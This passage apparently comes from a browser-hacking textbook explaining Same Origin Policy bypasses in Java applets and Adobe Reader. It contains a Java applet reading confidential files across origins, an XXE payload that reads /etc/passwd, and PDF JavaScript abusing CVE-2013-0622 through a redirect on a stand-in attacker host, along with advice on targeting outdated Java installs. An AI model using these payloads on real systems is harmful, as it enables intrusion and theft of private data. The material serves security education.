
import java.awt.*; import java.applet.Applet ; 
import java.io.* ; import java.net.*;

public class `zipSopBypass` extends `Applet` {
 private `TextArea` `ltArea` = new `TextArea`("", 100, 300); 
 public void `init` (){ 
   add(`ltArea`);
 }

 public void `paint` (`Graphics` g) {
  g.drawString("Reading file content in JAR...", 80, 80);
  // the applet is loaded from 
  //the http://browserhacker.com origin
  String url = "jar:https://browservictim.com/"+
   "stuff/confidential.odt!/content.xml"; 
  String content = ""; 
  try{
   `URL` u = new `URL`(url);
   `BufferedReader` ff = new `BufferedReader`(
     new `InputStreamReader`(u.openStream())
   );
   while (ff.ready()){ 
     content += ff.readLine(); 
   }
  }catch(Exception e){ 
    g.drawString( "Error",100,100); 
  }

  `ltArea`.setText(content); 
  g.drawString(content ,100,100); 
}
}

Note that the url variable from the previous code is pointing to the content.xml resource contained inside the odt file archive. In Open Office documents, every file contains a content.xml resource.

Almost all the Java SOP bypasses described in the previous pages have been patched by Oracle. However, according to security companies like WebSense8 and Bit9,9 the majority of enterprises still use old and vulnerable versions of Java. Around July 2013, Bit9 collected Java usage statistics from almost 400 organizations using Bit9’s software reputation service. In total, approximately 1 million enterprise endpoint systems were surveyed. About 80 percent of those systems used Java 6. In those environments, it was still possible to run unsigned applets without user intervention.

The Click to Play security control has been introduced in the latest browsers and in Java itself. You may expect this to stop your ability to employ Java applets in your browser hacking. In fact, although it will slow you down, it won’t necessarily stop you. Don’t forget Internet Explorer 9 and below does not implement Click to Play. Also, according to the Bit9 survey, 93 percent of organizations had multiple versions of Java installed on the same machine. This means there is still plenty of opportunity to use Java during your browser hacking. With systems having multiple versions of Java, you can target the older versions and target browsers that don’t employ the Click to Play control.

 start figure 

[**Figure 4-2:**](#c04.html#figureanchor4-2) Java security bug time line from 2012 to mid-2013.

![c04f002.tif](image_fi/662090c04/c04f002.png)

 end figure 

The widespread presence of the Java plugin makes it a perfect target for attackers. Eric Romang summarized a time line of Java zero days that led to arbitrary code execution, as displayed in [Figure 4-2](#c04.html#figure4-2).10 Whilst these are not SOP bypasses, the time line is suggestive of what you can expect in the future.

## Bypassing SOP in Adobe Reader

Adobe Reader is infamous for the number of security bugs that have been found in its browser plugin. There is a seemingly countless number of arbitrary code execution bugs caused by such classical problems as overflows and Use After Free vulnerabilities.11 Attacking Adobe Reader more directly will be covered in the “Attacking PDF Readers” section of Chapter 8, but it’s important to understand how flaws within the plugin can help bypass the SOP.

As you may know, the Adobe Reader PDF parser understands JavaScript.12 This attribute is often used by malware to hide malicious code inside PDFs.

One of these flaws that allowed for the bypassing of the SOP is CVE-2013-0622, discovered by Billy Rios, Federico Lanusse, and Mauro Gentile. The attack (now patched in Adobe Reader versions greater than 11.0.0) was similar to the second SOP bypass discussed previously in the Java section, where exploiting an open redirect would allow a foreign origin to access the origin of the redirect. Similar to this attack, a request that returns a 302 redirect response code is used to exploit the vulnerability. Another interesting aspect of the bug is that the SOP was not enforced when specifying a resource using an XML External Entity (XXE).

Conventional XXE injection involves trying to inject malicious payloads into requests that accept XML input, such as the following:

```
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "/etc/passwd" >]><foo>&xxe;</foo>
```

If the XML parser allows external entities, the value of &xxe, is then replaced with the contents of /etc/passwd. The same technique can be used to bypass the SOP. It involves loading (as an external entity) the resource and the server replying with a 302 redirect. The real resource you want to retrieve is the target of the redirection. Consider the following JavaScript code snippet, which is contained in a PDF file:

```
var xml="<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY> <! ENTITY xxe 
SYSTEM \"http://browserhacker.com?redirect=
http%3A%2F%2Fbrowservictim.com%2Fdocument.txt\">]>
<foo>&xxe;</foo>";
var xdoc = XMLData.parse(xml,false);
app.alert(escape(xdoc.foo.value));
```

When the PDF is loaded, the preceding JavaScript code is executed. A GET request is sent to browserhacker.com, which replies with an HTTP 302 response, redirecting to the value of the redirect parameter. This results in document.txt (from browservictim.com) being retrieved and parsed.

The origin of http://browserhacker.com should not have access to content in the http://browservictim.com origin. This is clearly a security flaw of the Adobe Reader SOP implementation, because only resources from the same-origin where the PDF was loaded from should be read. In this case, you’re reading a resource from a different origin than the one where the PDF was loaded. Exploiting this bug has a limitation, though, which can be generally applied to XXE injection bugs. The resource to be retrieved needs to be either a plain or XML document type; otherwise, the XML parser will throw an error.
